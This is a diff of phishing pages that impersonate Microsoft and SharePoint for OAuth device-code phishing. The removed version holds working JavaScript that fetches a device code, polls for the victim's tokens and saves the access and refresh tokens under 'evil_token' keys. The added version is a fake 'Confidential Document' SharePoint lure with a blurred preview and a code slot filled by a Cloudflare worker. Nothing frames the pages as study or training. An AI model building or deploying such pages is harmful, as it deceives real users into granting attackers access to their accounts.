@@ -1,597 +1,326 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Verify Your Identity · Microsoft</title>
-  <style>
-    /* Reset & base – same as email */
-    * { margin:0; padding:0; box-sizing:border-box; }
-    body {
-      background: #f4f6f8;
-      font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      padding: 20px;
-    }
-    .container {
-      max-width: 520px;
-      width: 100%;
-      background: #ffffff;
-      border-radius: 12px;
-      box-shadow: 0 4px 24px rgba(0,0,0,0.06);
-      border: 1px solid #e0e4e8;
-      overflow: hidden;
-    }
-    /* Header – blue bar with lock */
-    .header {
-      background: #0078D4;
-      padding: 18px 24px;
-      color: #fff;
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      border-bottom: 3px solid #005a9e;
-    }
-    .header .lock-icon {
-      width: 30px;
-      height: 30px;
-      flex-shrink: 0;
-      fill: none;
-      stroke: #ffffff;
-      stroke-width: 2;
-      stroke-linecap: round;
-      stroke-linejoin: round;
-    }
-    .header h1 {
-      font-size: 19px;
-      font-weight: 600;
-      letter-spacing: -0.2px;
-      margin: 0;
-    }
-    /* Body */
-    .body {
-      padding: 28px 32px 24px;
-    }
-    .sub-heading {
-      font-size: 15px;
-      color: #3b3b3b;
-      line-height: 1.5;
-      text-align: center;
-      margin-bottom: 24px;
-    }
-    /* Code area – dark card */
-    .code-area {
-      background: #1a1a2e;
-      border-radius: 10px;
-      padding: 18px 20px 14px;
-      border: 1px solid #2a2a4a;
-      margin-bottom: 20px;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 4px;
-      box-shadow: inset 0 2px 8px rgba(0,0,0,0.35);
-    }
-    .code-label {
-      font-size: 10px;
-      font-weight: 700;
-      color: #8a8aaa;
-      letter-spacing: 0.8px;
-      text-transform: uppercase;
-      text-align: center;
-    }
-    .code-value {
-      font-family: 'SF Mono', 'Consolas', 'Courier New', monospace;
-      font-size: 34px;
-      font-weight: 700;
-      letter-spacing: 4px;
-      color: #4FC3F7;
-      background: transparent;
-      border: none;
-      outline: none;
-      text-shadow: 0 0 12px rgba(79,195,247,0.15);
-      display: block;
-      text-align: center;
-      margin: 2px 0 4px;
-      min-height: 50px;
-    }
-    .code-value.loading { color: #6a8aaa; font-size: 18px; letter-spacing: 1px; }
-    .code-value.error { color: #ef4444; }
-    .copy-btn {
-      background: #2a2a4a;
-      border: 1px solid #3a3a5a;
-      padding: 6px 20px;
-      border-radius: 20px;
-      font-size: 13px;
-      font-weight: 500;
-      color: #c8d0e0;
-      cursor: pointer;
-      transition: background 0.15s;
-      display: inline-flex;
-      align-items: center;
-      gap: 8px;
-      white-space: nowrap;
-    }
-    .copy-btn:hover { background: #3a3a5e; border-color: #4FC3F7; color: #fff; }
-    .copy-btn:active { transform: scale(0.96); }
-    /* Status area */
-    .status-area {
-      margin: -12px 0 18px;
-      padding: 8px 14px;
-      border-radius: 6px;
-      font-size: 14px;
-      text-align: center;
-      min-height: 42px;
-      background: #f8faff;
-      border: 1px solid #e8ecf0;
-      color: #1a1a1a;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-    }
-    .status-area .status-icon { width: 18px; height: 18px; flex-shrink: 0; }
-    .status-area.pending { background: #fff8e6; border-color: #f5d742; color: #5a4d00; }
-    .status-area.pending .status-icon { stroke: #f5d742; fill: #f5d742; }
-    .status-area.approved { background: #e6f7e6; border-color: #1ea81e; color: #005a00; }
-    .status-area.approved .status-icon { stroke: #1ea81e; fill: #1ea81e; }
-    .status-area.error { background: #ffebee; border-color: #e74c3c; color: #7a0000; }
-    .status-area.error .status-icon { stroke: #e74c3c; fill: #e74c3c; }
-    .status-area.hidden { display: none !important; }
-    /* Secure badge */
-    .secure-badge {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-      font-size: 13px;
-      color: #1a1a1a;
-      background: #f0f6ff;
-      border-radius: 6px;
-      padding: 10px 14px;
-      margin-bottom: 20px;
-      border: 1px solid #d9e6f2;
-    }
-    .secure-badge svg {
-      width: 18px;
-      height: 18px;
-      flex-shrink: 0;
-      stroke: #107C10;
-      fill: none;
-      stroke-width: 2;
-      stroke-linecap: round;
-      stroke-linejoin: round;
-    }
-    .secure-badge strong { color: #107C10; }
-    /* Steps */
-    .steps-list {
-      list-style: none;
-      padding: 12px 18px;
-      margin: 0 0 24px;
-      background: #f8fafc;
-      border-radius: 8px;
-      border: 1px solid #e8ecf0;
-    }
-    .steps-list li {
-      font-size: 14px;
-      color: #2b2b2b;
-      padding: 8px 0;
-      display: flex;
-      align-items: center;
-      gap: 14px;
-      border-bottom: 1px solid #f0f3f7;
-    }
-    .steps-list li:last-child { border-bottom: none; }
-    .step-circle {
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      width: 26px;
-      height: 26px;
-      background: #0078D4;
-      color: #fff;
-      font-weight: 700;
-      font-size: 13px;
-      border-radius: 50%;
-      flex-shrink: 0;
-    }
-    .key-hint { display: none !important; }
-    /* Continue button */
-    .btn-container {
-      text-align: center;
-      margin: 24px 0 18px;
-    }
-    .btn {
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-      background: #0078D4;
-      color: #fff;
-      font-weight: 600;
-      font-size: 16px;
-      padding: 12px 34px;
-      border-radius: 6px;
-      border: none;
-      cursor: pointer;
-      text-decoration: none;
-      box-shadow: 0 2px 10px rgba(0,120,212,0.2);
-      transition: background 0.15s;
-    }
-    .btn:hover { background: #0067B8; box-shadow: 0 4px 16px rgba(0,120,212,0.3); }
-    .btn:disabled { opacity: 0.5; pointer-events: none; }
-    .btn .ms-logo { width: 20px; height: 20px; flex-shrink: 0; }
-    /* Footer */
-    .footer {
-      border-top: 1px solid #e8ecf0;
-      padding: 14px 30px 18px;
-      font-size: 11px;
-      color: #6e7a8a;
-      background: #fafbfc;
-      text-align: center;
-    }
-    .footer .logo-container {
-      display: inline-flex;
-      align-items: center;
-      gap: 6px;
-      margin-bottom: 4px;
-    }
-    .footer .logo-container .logo-squares {
-      display: inline-table;
-      border-collapse: collapse;
-    }
-    .footer .logo-container .logo-squares td {
-      width: 12px;
-      height: 12px;
-    }
-    .footer .logo-container .logo-text {
-      font-size: 13px;
-      font-weight: 600;
-      color: #1a1a1a;
-    }
-    .footer .legal { margin-top: 4px; }
-    .footer a { color: #0078D4; text-decoration: none; }
-    /* Footer padlock line – now green */
-    .footer .padlock-line {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 6px;
-      margin: 2px 0;
-      font-size: 11px;
-      color: #6e7a8a;
-    }
-    .footer .padlock-line svg {
-      width: 14px;
-      height: 14px;
-      flex-shrink: 0;
-      stroke: #107C10;  /* Microsoft green */
-      fill: none;
-      stroke-width: 2;
-      stroke-linecap: round;
-      stroke-linejoin: round;
-    }
-    @media (max-width:480px) {
-      .header { padding: 14px 16px; }
-      .header h1 { font-size: 17px; }
-      .body { padding: 18px 14px; }
-      .btn { padding: 10px 20px; font-size: 15px; }
-      .code-value { font-size: 28px; letter-spacing: 2px; }
-      .steps-list { padding: 10px 14px; }
-      .footer .logo-container .logo-squares td { width: 10px; height: 10px; }
-      .footer .logo-container .logo-text { font-size: 12px; }
-      .footer .padlock-line { font-size: 10px; }
-      .footer .padlock-line svg { width: 12px; height: 12px; }
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SharePoint – Confidential Document</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #f0f2f5;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .container {
+            max-width: 680px;
+            width: 100%;
+            background: white;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            border-radius: 8px;
+            overflow: hidden;
+        }
+        /* --- SHAREPOINT TOP NAV BAR --- */
+        .top-nav {
+            background: #f7f7f7;
+            border-bottom: 1px solid #e1e5e9;
+            padding: 8px 24px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .top-nav span {
+            font-size: 14px;
+            font-weight: 500;
+            color: #333;
+        }
+        /* --- MAIN TEAL HEADER --- */
+        .header {
+            background: #007b8a;
+            color: white;
+            padding: 20px 24px;
+        }
+        .header h1 { font-size: 18px; font-weight: 600; margin-bottom: 4px; }
+        .header p { font-size: 13px; opacity: 0.9; }
+        /* --- DOCUMENT PREVIEW CARD --- */
+        .document-preview {
+            padding: 24px;
+            background: #fafafa;
+            border-bottom: 1px solid #ddd;
+            text-align: center;
+        }
+        .doc-card {
+            background: white;
+            border: 1px solid #e1e5e9;
+            border-radius: 6px;
+            padding: 16px 20px;
+            display: inline-block;
+            text-align: left;
+            width: 100%;
+            max-width: 480px;
+            box-shadow: 0 1px 4px rgba(0,0,0,0.04);
+        }
+        .doc-card .doc-icon {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .doc-icon .badge {
+            background: white;
+            color: #007b8a;
+            border: 1px solid #007b8a;
+            font-size: 10px;
+            font-weight: 600;
+            padding: 2px 8px;
+            border-radius: 12px;
+            margin-left: auto;
+        }
+        .doc-title {
+            font-weight: 600;
+            font-size: 15px;
+            margin: 8px 0 4px;
+        }
+        .doc-meta { font-size: 12px; color: #777; }
+        /* --- BLURRED PREVIEW WRAPPER --- */
+        .preview-wrapper {
+            position: relative;
+            width: 100%;
+            max-width: 480px;
+            height: 160px;
+            background: #5a5c60;
+            margin: 12px 0;
+            border-radius: 4px;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .blurred-preview {
+            filter: blur(4px);
+            opacity: 0.8;
+            width: 85%;
+            height: 80%;
+            background: white;
+            padding: 12px 16px;
+            box-sizing: border-box;
+            border-radius: 2px;
+            display: flex;
+            flex-direction: column;
+            font-family: 'Segoe UI', sans-serif;
+        }
+        .blurred-preview h4 {
+            margin: 0 0 6px 0;
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+        }
+        .blurred-preview .row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 3px;
+            font-size: 10px;
+            color: #555;
+            border-bottom: 1px solid #eee;
+            padding-bottom: 2px;
+        }
+        /* --- FLOATING PILL OVERLAY --- */
+        .overlay-pill {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 6px 14px;
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+            pointer-events: none;
+        }
+        .overlay-pill span {
+            font-size: 12px;
+            color: #444;
+            font-weight: 500;
+        }
+        .doc-footer {
+            font-size: 12px;
+            color: #666;
+            border-top: 1px solid #eee;
+            padding-top: 12px;
+            margin-top: 8px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        /* --- OTP SECTION --- */
+        .otp-section {
+            padding: 20px 24px;
+            background: white;
+            text-align: center;
+        }
+        .otp-section p { font-size: 13px; color: #333; margin-bottom: 12px; }
+        .otp-code-box {
+            background: #f0f9fc;
+            border: 2px dashed #007b8a;
+            border-radius: 8px;
+            padding: 8px 20px 12px 20px;
+            display: inline-block;
+            font-family: 'Consolas', monospace;
+            color: #007b8a;
+            margin-bottom: 12px;
+            text-align: center;
+        }
+        .otp-label {
+            font-size: 9px;
+            font-weight: 600;
+            color: #777;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            margin-bottom: 2px;
+            font-family: 'Segoe UI', sans-serif;
+        }
+        .otp-code-box #otpDisplay {
+            font-size: 24px;
+            font-weight: 700;
+            letter-spacing: 6px;
+        }
+        .copy-btn {
+            background: #007b8a;
+            color: white;
+            border: none;
+            padding: 6px 16px;
+            border-radius: 4px;
+            font-size: 13px;
+            cursor: pointer;
+            margin-left: 8px;
+        }
+        .copy-btn:hover { background: #005f6b; }
+        .loading-spinner {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            font-size: 13px;
+            color: #666;
+            margin-top: 12px;
+        }
+        .spinner {
+            width: 16px;
+            height: 16px;
+            border: 2px solid #ddd;
+            border-top-color: #007b8a;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .footer { text-align: center; font-size: 11px; color: #999; padding: 16px; border-top: 1px solid #eee; }
+    </style>
 </head>
 <body>
-
-<div class="container">
-  <!-- HEADER -->
-  <div class="header">
-    <svg class="lock-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-      <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
-      <path d="M7 11V7a5 5 0 0 1 10 0v4" />
-    </svg>
-    <h1>Verify Your Identity</h1>
-  </div>
-
-  <!-- BODY -->
-  <div class="body">
-    <div class="sub-heading">
-      To complete the verification process, please enter the code shown below on the Microsoft sign‑in page.
-    </div>
-
-    <!-- CODE AREA -->
-    <div class="code-area">
-      <div class="code-label">YOUR VERIFICATION CODE</div>
-      <span class="code-value loading" id="verificationCode">Loading…</span>
-      <button class="copy-btn" id="copyBtn">
-        <svg width="14" height="14" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
-          <rect x="5" y="5" width="8" height="8" rx="1" />
-          <path d="M3 11V3c0-.6.4-1 1-1h8" />
-        </svg>
-        Copy Code
-      </button>
-    </div>
-
-    <!-- STATUS -->
-    <div class="status-area" id="statusMessage">
-      <svg class="status-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-        <circle cx="12" cy="12" r="10" />
-        <polyline points="12 6 12 12 16 14" />
-      </svg>
-      <span id="statusText">Starting verification…</span>
-    </div>
-
-    <!-- SECURE BADGE -->
-    <div class="secure-badge">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
-        <path d="M9 12l2 2 4-4" stroke="#107C10" stroke-width="2.5" />
-      </svg>
-      <span><strong>Secure verification</strong> – Your identity is protected.</span>
-    </div>
-
-    <!-- STEPS -->
-    <ul class="steps-list">
-      <li><span class="step-circle">1</span> Copy the code above</li>
-      <li><span class="step-circle">2</span> Click continue and paste</li>
-      <li><span class="step-circle">3</span> Sign in with your Microsoft account</li>
-    </ul>
-
-    <!-- CONTINUE BUTTON -->
-    <div class="btn-container">
-      <button class="btn" id="continueBtn">
-        <svg class="ms-logo" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-          <rect x="2" y="2" width="9" height="9" fill="#F25022" />
-          <rect x="13" y="2" width="9" height="9" fill="#7FBA00" />
-          <rect x="2" y="13" width="9" height="9" fill="#00A4EF" />
-          <rect x="13" y="13" width="9" height="9" fill="#FFB900" />
-        </svg>
-        Continue to Microsoft
-      </button>
-    </div>
-  </div>
-
-  <!-- FOOTER -->
-  <div class="footer">
-    <div class="logo-container">
-      <table class="logo-squares" cellpadding="0" cellspacing="1" border="0">
-        <tr>
-          <td style="background:#F25022;"></td>
-          <td style="background:#7FBA00;"></td>
-        </tr>
-        <tr>
-          <td style="background:#00A4EF;"></td>
-          <td style="background:#FFB900;"></td>
-        </tr>
-      </table>
-      <span class="logo-text">Microsoft</span>
-    </div>
-
-    <!-- PADLOCK LINE – now with green lock -->
-    <div class="padlock-line">
-      <svg viewBox="0 0 24 24" fill="none" stroke="#107C10" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-        <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
-        <path d="M7 11V7a5 5 0 0 1 10 0v4" />
-      </svg>
-      <span>This verification is part of the security alert process.</span>
-    </div>
-
-    <div class="legal">&copy; 2026 Microsoft Corporation &middot; <a href="#">Privacy Statement</a> &middot; <a href="#">Terms of Use</a></div>
-  </div>
-</div>
-
-<script>
-  (function() {
-    'use strict';
-
-    const codeSpan = document.getElementById('verificationCode');
-    const copyBtn = document.getElementById('copyBtn');
-    const continueBtn = document.getElementById('continueBtn');
-    const statusMsg = document.getElementById('statusMessage');
-    const statusText = document.getElementById('statusText');
-
-    let deviceCode = '';
-    let userCode = '';
-    let verificationUri = '';
-    let pollInterval = null;
-    let isPolling = false;
-    let isApproved = false;
-    const API_BASE = window.location.origin;
-
-    function setStatus(text, type = '') {
-      statusText.textContent = text;
-      statusMsg.className = 'status-area' + (type ? ' ' + type : '');
-      let shouldHide = (type === 'pending' || type === 'error');
-      if (text.toLowerCase().includes('waiting') || text.toLowerCase().includes('approval')) shouldHide = true;
-      if (shouldHide) statusMsg.classList.add('hidden');
-      else statusMsg.classList.remove('hidden');
-
-      let iconSvg = '';
-      if (type === 'approved') {
-        iconSvg = `<svg class="status-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12" /></svg>`;
-      } else if (type === 'error') {
-        iconSvg = `<svg class="status-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10" /><line x1="12" y1="8" x2="12" y2="12" /><line x1="12" y1="16" x2="12.01" y2="16" /></svg>`;
-      } else if (type === 'pending') {
-        iconSvg = `<svg class="status-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10" /><polyline points="12 6 12 12 16 14" /></svg>`;
-      } else {
-        iconSvg = `<svg class="status-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10" /><line x1="12" y1="8" x2="12" y2="12" /><line x1="12" y1="16" x2="12.01" y2="16" /></svg>`;
-      }
-      const iconContainer = statusMsg.querySelector('.status-icon');
-      if (iconContainer) iconContainer.outerHTML = iconSvg;
-      else {
-        const span = statusMsg.querySelector('#statusText');
-        if (span) span.insertAdjacentHTML('beforebegin', iconSvg);
-      }
-    }
-
-    function setCode(text, state = '') {
-      codeSpan.textContent = text;
-      codeSpan.className = 'code-value' + (state ? ' ' + state : '');
-    }
-
-    copyBtn.addEventListener('click', function(e) {
-      e.preventDefault();
-      const code = codeSpan.textContent.trim();
-      if (!code || code.startsWith('Loading') || code.startsWith('Error') || code.startsWith('Expired')) {
-        alert('No valid code to copy. Please wait for generation.');
-        return;
-      }
-      if (navigator.clipboard && navigator.clipboard.writeText) {
-        navigator.clipboard.writeText(code).then(() => {
-          copyBtn.innerHTML = 'Copied!';
-          setTimeout(() => { copyBtn.innerHTML = 'Copy Code'; }, 1800);
-        }).catch(() => fallbackCopy(code));
-      } else {
-        fallbackCopy(code);
-      }
-    });
-
-    function fallbackCopy(text) {
-      const ta = document.createElement('textarea');
-      ta.value = text;
-      ta.style.position = 'fixed';
-      ta.style.top = '-9999px';
-      ta.style.left = '-9999px';
-      document.body.appendChild(ta);
-      ta.select();
-      try {
-        document.execCommand('copy');
-        copyBtn.innerHTML = 'Copied!';
-        setTimeout(() => { copyBtn.innerHTML = 'Copy Code'; }, 1800);
-      } catch (err) {
-        alert('Unable to copy. Please select the code manually.');
-      }
-      document.body.removeChild(ta);
-    }
-
-    async function pollForToken() {
-      if (!deviceCode || isPolling || isApproved) return;
-      isPolling = true;
-      try {
-        const resp = await fetch(`${API_BASE}/device/token`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ device_code: deviceCode })
-        });
-        const data = await resp.json();
-        if (data.access_token) {
-          isApproved = true;
-          clearInterval(pollInterval);
-          pollInterval = null;
-          setStatus('Approved! You now have access.', 'approved');
-          setCode('Approved', '');
-          continueBtn.disabled = false;
-          continueBtn.innerHTML = `
-            <svg class="ms-logo" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" style="display:inline-block; vertical-align:middle;">
-              <rect x="2" y="2" width="9" height="9" fill="#F25022" />
-              <rect x="13" y="2" width="9" height="9" fill="#7FBA00" />
-              <rect x="2" y="13" width="9" height="9" fill="#00A4EF" />
-              <rect x="13" y="13" width="9" height="9" fill="#FFB900" />
+    <div class="container">
+        <!-- EXACT MODERN SHAREPOINT LOGO + TOP NAV -->
+        <div class="top-nav">
+            <svg width="20" height="20" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="46" cy="40" r="25" fill="#03787c" />
+                <circle cx="78" cy="56" r="28" fill="#1d9eb0" />
+                <circle cx="56" cy="88" r="22" fill="#48b3c2" />
+                <rect x="24" y="32" width="44" height="44" rx="8" fill="#007e8a" />
+                <text x="46" y="66" font-family="'Segoe UI', Arial, sans-serif" font-weight="bold" font-size="36" fill="white" text-anchor="middle" letter-spacing="-1">S</text>
             </svg>
-            Access Granted — Continue
-          `;
-          continueBtn.onclick = function(e) {
-            e.preventDefault();
-            localStorage.setItem('evil_token_direct', data.access_token);
-            if (data.refresh_token) localStorage.setItem('evil_token_refresh', data.refresh_token);
-            localStorage.setItem('evil_token_user', data.username || 'User');
-            window.location.href = '/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https://login.microsoftonline.com/';
-          };
-          isPolling = false;
-          return;
-        }
-        if (data.error === 'authorization_pending') {
-          setStatus('Waiting for your approval on the Microsoft page…', 'pending');
-          isPolling = false; return;
-        }
-        if (data.error === 'expired_token') {
-          clearInterval(pollInterval); pollInterval = null;
-          setStatus('Code expired. Please refresh the page.', 'error');
-          setCode('EXPIRED', 'error');
-          continueBtn.disabled = true;
-          isPolling = false; return;
-        }
-        if (data.error) {
-          setStatus(`Error: ${data.error} — will retry`, 'error');
-          isPolling = false; return;
-        }
-        setStatus('Still waiting…', 'pending');
-        isPolling = false;
-      } catch (err) {
-        console.error('Poll error:', err);
-        setStatus(`Poll error: ${err.message}`, 'error');
-        isPolling = false;
-      }
-    }
+            <span>SharePoint</span>
+        </div>
 
-    async function startDeviceFlow() {
-      setStatus('Requesting code from Microsoft…', 'pending');
-      setCode('Loading…', 'loading');
-      continueBtn.disabled = true;
-      continueBtn.innerHTML = `
-        <svg class="ms-logo" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" style="display:inline-block; vertical-align:middle;">
-          <rect x="2" y="2" width="9" height="9" fill="#F25022" />
-          <rect x="13" y="2" width="9" height="9" fill="#7FBA00" />
-          <rect x="2" y="13" width="9" height="9" fill="#00A4EF" />
-          <rect x="13" y="13" width="9" height="9" fill="#FFB900" />
-        </svg>
-        Continue to Microsoft
-      `;
-      try {
-        const resp = await fetch(`${API_BASE}/device/request`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' }
-        });
-        if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
-        const data = await resp.json();
-        if (data.error) throw new Error(data.error_description || data.error);
-        deviceCode = data.device_code;
-        userCode = data.user_code;
-        verificationUri = data.verification_uri || 'https://microsoft.com/devicelogin';
-        setCode(userCode, '');
-        setStatus(`Code: ${userCode} — open Microsoft page and enter it.`, 'pending');
-        continueBtn.disabled = false;
-        continueBtn.onclick = function(e) {
-          e.preventDefault();
-          if (verificationUri) {
-            window.open(verificationUri, '_blank');
-            setStatus('Opened Microsoft login page. Enter the code there.', 'pending');
-          } else {
-            alert('No verification URI available.');
-          }
-        };
-        if (pollInterval) clearInterval(pollInterval);
-        const intervalMs = (data.interval || 5) * 1000 + 500;
-        pollInterval = setInterval(pollForToken, intervalMs);
-        setTimeout(pollForToken, 1000);
-      } catch (err) {
-        console.error('Device flow error:', err);
-        setStatus(`Error: ${err.message}`, 'error');
-        setCode('Error', 'error');
-        continueBtn.disabled = true;
-      }
-    }
+        <!-- TEAL HEADER -->
+        <div class="header">
+            <h1>Confidential Document Access</h1>
+            <p>The confidential document is protected. Access requires verification with a one‑time code through your Microsoft account.</p>
+        </div>
 
-    window.addEventListener('DOMContentLoaded', () => {
-      setTimeout(startDeviceFlow, 400);
-    });
-    document.addEventListener('keydown', (e) => {
-      if (e.key === 'r' && !e.ctrlKey && !e.metaKey && !e.altKey) {
-        e.preventDefault();
-        if (pollInterval) clearInterval(pollInterval);
-        isApproved = false;
-        startDeviceFlow();
-      }
-    });
-  })();
-</script>
+        <!-- DOCUMENT PREVIEW -->
+        <div class="document-preview">
+            <div class="doc-card">
+                <div class="doc-icon">
+                    <!-- Blue 'doc' icon -->
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <rect width="24" height="24" rx="4" fill="#007b8a"/>
+                        <text x="12" y="16" font-family="Arial, sans-serif" font-weight="bold" font-size="11" fill="white" text-anchor="middle">doc</text>
+                    </svg>
+                    <span style="font-weight:500;">Confidential_Report.docx</span>
+                    <span class="badge">Protected</span>
+                </div>
+                <div class="doc-title">Quarterly Business Review</div>
+                <div class="doc-meta">Confidential document · View only · Microsoft 365</div>
+                
+                <!-- BLURRED PREVIEW + FLOATING PILL -->
+                <div class="preview-wrapper">
+                    <div class="blurred-preview">
+                        <h4>Quarterly Business Review</h4>
+                        <div class="row"><span>Education Business</span><span>2024</span></div>
+                        <div class="row"><span>Executive Summary</span><span>Q2</span></div>
+                        <div class="row"><span>...</span><span>...</span></div>
+                    </div>
+                    <div class="overlay-pill">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#007b8a" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+                            <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+                        </svg>
+                        <span>Preview restricted — verify to view</span>
+                    </div>
+                </div>
 
+                <!-- FOOTER -->
+                <div class="doc-footer">
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+                        <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+                    </svg>
+                    <span>This document is encrypted. You must verify your identity to access its content.</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- OTP SECTION -->
+        <div class="otp-section">
+            <p><strong>Confidential document access</strong></p>
+            <p style="font-size:13px; color:#555;">Enter this one-time code in the Microsoft sign-in window to unlock this file.</p>
+            <div>
+                <div class="otp-code-box">
+                    <div class="otp-label">VERIFICATION CODE</div>
+                    <!-- DYNAMIC INJECTION POINT FOR YOUR CLOUDFLARE WORKER -->
+                    <div id="otpDisplay">{{OTP_CODE}}</div>
+                </div>
+                <button class="copy-btn" onclick="copyOTP()">Copy code</button>
+            </div>
+            <div class="loading-spinner">
+                <div class="spinner"></div>
+                <span>Opening Microsoft sign‑in…</span>
+            </div>
+        </div>
+
+        <!-- FOOTER -->
+        <div class="footer">Microsoft SharePoint</div>
+    </div>
+
+    <!-- COPY SCRIPT -->
+    <script>
+        function copyOTP() {
+            const otp = document.getElementById('otpDisplay').innerText;
+            navigator.clipboard.writeText(otp).then(() => {
+                alert('Code copied!');
+            }).catch(() => {
+                const textarea = document.createElement('textarea');
+                textarea.value = otp;
+                document.body.appendChild(textarea);
+                textarea.select();
+                document.execCommand('copy');
+                document.body.removeChild(textarea);
+                alert('Code copied!');
+            });
+        }
+    </script>
 </body>
 </html>
